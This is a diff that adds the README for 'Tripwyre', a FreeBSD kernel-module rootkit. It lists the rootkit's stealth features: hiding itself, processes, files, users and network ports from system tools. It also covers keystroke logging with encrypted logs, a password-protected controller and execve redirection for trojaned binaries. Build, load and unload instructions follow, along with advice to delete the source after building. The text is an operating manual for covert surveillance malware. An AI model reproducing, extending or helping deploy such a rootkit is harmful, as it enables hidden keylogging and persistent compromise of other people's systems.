@@ -1,0 +1,100 @@
+
+Tripwyre LKM Rootkit for FreeBSD (Version 0.2)
+
+ABOUT
+
+	Tripwyre is a loadable kernel module rootkit for FreeBSD that works by
+	modifying the sysent system call table. It provides a lot a features
+	and it helped me learn kernel hacking on FreeBSD. This is a
+	short description of the rootkit.
+
+FEATURES
+	
+	* Hides itself from kldstat(1)
+	* Hide traffic through ports from netstat(1)
+	* Hides user's presence from w(1) and who(1)
+	* Hides files and directories from ls(1), cat(1), rm(1) etc.,
+	* Hides processes from ps(1) and top(1)
+	* Monitors network for ICMP and UDP Connections
+	* Capture keystrokes
+	* Encrypts the key logs
+	* Provides a controller with authentication using crypt(3)
+	* Provide execve redirection for Trojaned / Monitored binaries
+	
+FILES
+
+	This is a list of files in this distribution.
+
+	FILE: tripwyre-current.tar.gz
+
+	tripwyre-current/
+	  options.h		User customizable options
+	  tripwyre.c		The Loadable Kernel Module
+	  controller.c		The Controller Program
+	  controller_options.h	Options for the Controller
+	  compute_hash.c	A Program for computing hash
+	  decrypt.c		A file decryption utility
+	  rijndael.c		A public domain Rijndael algorithm
+	  rijndael.h		Header File for the above
+	  build.sh		A simple build script
+	  README		Short description (this file)
+	  TODO			Things to-do
+	  Makefile		Used to build the project
+	  tests/		Some Tests
+
+SETUP
+	
+	If you want to get started quickly, use the build script. 
+	Just run:
+
+	% ./build.sh
+	and follow the instructions. You can skip the rest of this
+	section.
+	
+	To customize and build the module, edit the options in ``options.h''
+	header file and run `make'' in this directory. See the short
+	description at the top of the Makefile. To remove the build run
+	``make clean''.
+
+	First run ``make compute_hash'' to compile the compute_hash
+	program and redirect the output of the program to the
+	controller_options.h headerfile like so:
+
+	% ./compute_hash >> controller_options.h
+
+	After this step proceed to building the controller.
+
+	To build the controller, run ``make controller''. To remove
+	the controller and compute_hash run ``make cclean'' or simply
+	remove the binaries.
+
+	To build the Decryption utility, run ''make decrypt''. To 
+	Remove run ''make cdecrypt''. 
+
+	Once the module and the controller are built delete the source
+	file or options.h and start using the programs. For the controller
+	what you type wont echo.
+
+	To encrypt run:
+        % cat hide_keylog | ./encrypt passphrase encrypted_keylog
+
+	To Decrypt run:
+	% ./decrypt passphrase encrypted_keylog | less
+
+USE
+	
+	Load the KLD using:
+	    sudo kldload ./module.ko
+
+	Unload using:
+	    sudo kldunload ./module.ko
+
+	Controller Usage:
+	    ./controller (type the passphrase and use the menus)
+
+	Decrypt tool:	(after unloading the module)
+	    ./decrypt /path/to/log/file		
+
+AUTHOR
+	
+	Satish Srinivasan (sathya) - sathya@freeshell.org
